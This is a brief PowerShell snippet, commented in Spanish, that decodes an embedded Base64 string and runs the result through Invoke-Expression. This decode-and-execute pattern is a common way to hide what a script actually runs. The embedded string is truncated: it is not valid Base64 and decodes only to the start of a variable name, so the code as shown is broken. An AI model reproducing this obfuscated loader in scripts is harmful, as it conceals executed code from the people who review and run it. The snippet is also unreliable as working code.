$base64Code = "JAB0AGEAcwBrAE4AYQBtAGU"

# Decodificar el código Base64 y eliminar espacios en blanco no deseados
$decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64Code.Trim()))

# Ejecutar el script decodificado
Invoke-Expression -Command $decodedScript
